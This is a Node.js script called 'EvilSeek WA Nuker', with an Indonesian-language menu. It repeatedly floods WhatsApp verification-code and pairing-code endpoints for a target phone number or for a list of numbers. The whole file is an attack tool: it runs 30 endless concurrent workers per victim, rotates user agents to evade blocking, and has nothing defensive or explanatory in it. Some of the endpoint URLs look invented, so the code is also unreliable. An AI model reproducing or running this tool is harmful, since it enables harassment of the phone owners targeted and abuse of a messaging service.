#!/usr/bin/env node
// wa_spam.js - EvilSeek WA Nuker (Node.js)

const axios = require('axios');
const readline = require('readline');
const { promisify } = require('util');
const sleep = promisify(setTimeout);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const question = (query) => new Promise(resolve => rl.question(query, resolve));

const BANNER = `
\x1b[33m
   ██████╗ ██╗   ██╗██╗██╗     ███████╗███████╗███████╗██╗  ██╗
  ██╔═══██╗██║   ██║██║██║     ██╔════╝██╔════╝██╔════╝██║ ██╔╝
  ██║   ██║██║   ██║██║██║     █████╗  ███████╗███████╗█████╔╝ 
  ██║   ██║╚██╗ ██╔╝██║██║     ██╔══╝  ╚════██║╚════██║██╔═██╗ 
  ╚██████╔╝ ╚████╔╝ ██║███████╗███████╗███████║███████║██║  ██╗
   ╚═════╝   ╚═══╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
\x1b[33m1010 0110 1010 0110 1010  SPAMMER 0110 10001010101 01010100010\x1b[0m
`;

const ENDPOINTS_OTP = [
  'https://api.whatsapp.com/sendcode',
  'https://web.whatsapp.com/otp/request',
  'https://api.whatsapp.net/v1/phone/request_code'
];
const ENDPOINTS_PAIR = [
  'https://api.whatsapp.com/pair',
  'https://web.whatsapp.com/pair-code'
];
const USER_AGENTS = [
  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/110.0.0.0'
];
const THREADS = 30;
const DELAY_MIN = 300;
const DELAY_MAX = 1200;

function random(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randDelay() { return Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN; }

async function sendRequest(phone, endpointList, mode = 'OTP') {
  const url = random(endpointList);
  const headers = {
    'User-Agent': random(USER_AGENTS),
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded'
  };
  const data = `phone=${encodeURIComponent(phone)}&country_code=${phone.startsWith('+') ? phone.slice(0,3) : '62'}`;
  try {
    const resp = await axios.post(url, data, { headers, timeout: 8000 });
    if ([200, 201, 202, 204].includes(resp.status)) {
      console.log(`\x1b[32m[✓] ${mode} OK | ${phone} | ${url.split('/').pop()}\x1b[0m`);
    } else {
      console.log(`\x1b[33m[•] ${mode} ${resp.status} | ${phone} | ${JSON.stringify(resp.data).slice(0,30)}\x1b[0m`);
    }
  } catch (e) {
    console.log(`\x1b[31m[✗] ${mode} fail | ${phone} | ${e.message.slice(0,20)}\x1b[0m`);
  }
}

async function worker(phone, mode = 'OTP') {
  const endpoints = mode === 'OTP' ? ENDPOINTS_OTP : ENDPOINTS_PAIR;
  while (true) {
    await sendRequest(phone, endpoints, mode);
    await sleep(randDelay());
  }
}

async function loadNumbers(filePath = 'numbers.txt') {
  const fs = require('fs');
  if (!fs.existsSync(filePath)) return [];
  const content = fs.readFileSync(filePath, 'utf-8');
  return content.split('\n').map(l => l.trim()).filter(l => l);
}

async function main() {
  console.log(BANNER);
  console.log('\x1b[33m[1] SPAM OTP (single number)');
  console.log('[2] SPAM OTP (from numbers.txt)');
  console.log('[3] SPAM PAIRING CODE (single)');
  console.log('[4] EXIT\x1b[0m');
  console.log('\x1b[36m' + '='.repeat(50) + '\x1b[0m');
  const pilih = await question('\x1b[36mPilih: \x1b[0m');

  if (pilih === '1') {
    const phone = await question('\x1b[36mNomor (+628...): \x1b[0m');
    if (!phone) return main();
    console.log(`\x1b[32m\n[!] Mulai OTP spam ke ${phone} (Ctrl+C stop)\n\x1b[0m`);
    // Jalankan beberapa worker
    for (let i = 0; i < THREADS; i++) {
      worker(phone, 'OTP');
    }
  } else if (pilih === '2') {
    const nums = await loadNumbers();
    if (nums.length === 0) {
      console.log('\x1b[31mBuat file numbers.txt (satu nomor per baris)\x1b[0m');
      await sleep(2000);
      return main();
    }
    console.log(`\x1b[32m[!] Memuat ${nums.length} nomor dari file\x1b[0m`);
    for (const phone of nums) {
      for (let i = 0; i < THREADS; i++) {
        worker(phone, 'OTP');
      }
    }
  } else if (pilih === '3') {
    const phone = await question('\x1b[36mNomor (+628...): \x1b[0m');
    if (!phone) return main();
    console.log(`\x1b[32m\n[!] Mulai PAIRING CODE spam ke ${phone}\n\x1b[0m`);
    for (let i = 0; i < THREADS; i++) {
      worker(phone, 'PAIR');
    }
  } else if (pilih === '4') {
    console.log('\x1b[31mKeluar. Selamat bertahan di Aquarius-5.\x1b[0m');
    process.exit(0);
  } else {
    console.log('\x1b[31mPilihan salah.\x1b[0m');
    await sleep(1000);
    return main();
  }

  // Biarkan proses berjalan (tidak ada menu lagi)
  await sleep(1000000000);
}

main().catch(console.error);
